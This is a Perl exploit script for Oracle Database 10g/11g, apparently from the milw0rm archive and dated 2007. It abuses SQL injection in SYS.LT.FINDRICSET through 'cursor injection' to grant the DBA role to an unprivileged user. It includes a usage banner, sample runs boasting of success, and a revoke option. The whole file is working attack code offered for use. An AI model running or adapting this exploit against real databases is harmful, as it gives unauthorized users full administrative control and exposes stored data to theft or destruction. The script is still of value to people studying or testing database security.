#!/usr/bin/perl
# 
# http://rawlab.mindcreations.com/codes/exp/oracle/sys-lt-findricsetV2.pl
#
# Oracle SYS.LT.FINDRICSET exploit (11g/10g)
#  - Version 2 - New "evil cursor injection" tip!
#  - No "create procedure" privilege needed!
#  - See: http://www.databasesecurity.com/ (Cursor Injection)
#
# Grant or revoke dba permission to unprivileged user
# 
# Tested on "Oracle Database 10g Enterprise Edition Release 10.1.0.5.0"
#
# Fixed with CPU Oct. 2007
# 
#   REF:    Thanks to Joxean Koret and his excellent Inguma 
#	    http://sourceforge.net/projects/inguma
#   
#   AUTHOR: Andrea "bunker" Purificato
#           http://rawlab.mindcreations.com
#
#   DATE:   Copyright 2007 - Fri Oct 26 15:03:46 CEST 2007
#
# Oracle InstantClient (basic + sdk) required for DBD::Oracle
# 
#
# bunker@fin:~$ perl sys-lt-findricsetV2.pl -h localhost -s FAKE -u sfigato -p **** -r
#  [-] Wait...
#  [-] Revoking DBA from SFIGATO...
#  DBD::Oracle::db do failed: ORA-01031: insufficient privileges (DBD ERROR: OCIStmtExecute) [for Statement "REVOKE DBA FROM SFIGATO"] at sys-lt-findricsetV2.pl line 69.
#  [-] Done!
# 
# bunker@fin:~$ perl sys-lt-findricsetV2.pl -h localhost -s FAKE -u sfigato -p **** -g
#  [-] Wait...
#  [-] Creating evil cursor...
#  Cursor: 1
#  [-] Go...
#  [-] YOU GOT THE POWAH!!
# 
# bunker@fin:~$ perl sys-lt-findricsetV2.pl -h localhost -s FAKE -u sfigato -p **** -r
#  [-] Wait...
#  [-] Revoking DBA from SFIGATO...
#  [-] Done!
#

use warnings;
use strict;
use DBI;
use Getopt::Std;
use vars qw/ %opt /;

sub usage {
    print <<"USAGE";
    
Syntax: $0 -h <host> -s <sid> -u <user> -p <passwd> -g|-r [-P <port>]

Options:
     -h     <host>     target server address
     -s     <sid>      target sid name
     -u     <user>     user
     -p     <passwd>   password 

     -g|-r             (g)rant dba to user | (r)evoke dba from user
    [-P     <port>     Oracle port]

USAGE
    exit 0
}

my $opt_string = 'h:s:u:p:grP:';
getopts($opt_string, \%opt) or &usage;
&usage if ( !$opt{h} or !$opt{s} or !$opt{u} or !$opt{p} );
&usage if ( !$opt{g} and !$opt{r} );
my $user = uc $opt{u};

my $dbh = undef;
if ($opt{P}) {
    $dbh = DBI->connect("dbi:Oracle:host=$opt{h};sid=$opt{s};port=$opt{P}", $opt{u}, $opt{p}) or die;
} else {
    $dbh = DBI->connect("dbi:Oracle:host=$opt{h};sid=$opt{s}", $opt{u}, $opt{p}) or die;
}

my $sqlcmd = "GRANT DBA TO $user";
print "[-] Wait...\n";
$dbh->func( 1000000, 'dbms_output_enable' );


if ($opt{r}) {
    print "[-] Revoking DBA from $user...\n";
    $sqlcmd = "REVOKE DBA FROM $user";
    $dbh->do( $sqlcmd );
    print "[-] Done!\n";
    $dbh->disconnect;
    exit;
}

print "[-] Creating evil cursor...\n";
my $sth = $dbh->prepare(qq{
DECLARE
MYC NUMBER;
BEGIN
  MYC := DBMS_SQL.OPEN_CURSOR;
  DBMS_SQL.PARSE(MYC,'declare pragma autonomous_transaction; begin execute immediate ''$sqlcmd'';commit;end;',0);
  DBMS_OUTPUT.PUT_LINE('Cursor: '||MYC);
END;
} );
$sth->execute;
my $cursor = undef;
while (my $line = $dbh->func( 'dbms_output_get' )) { 
    print "$line\n";
    if ($line =~ /^Cursor: (\d)/) {$cursor = $1;}
}
$sth->finish;

print "[-] Go...\n";
$sth = $dbh->prepare(qq{
BEGIN
  SYS.LT.FINDRICSET('.''||dbms_sql.execute($cursor)||'''')--','x');
END;
});
$sth->execute;
$sth->finish;
print "[-] YOU GOT THE POWAH!!\n";
$dbh->disconnect;
exit;

# milw0rm.com [2007-10-27]
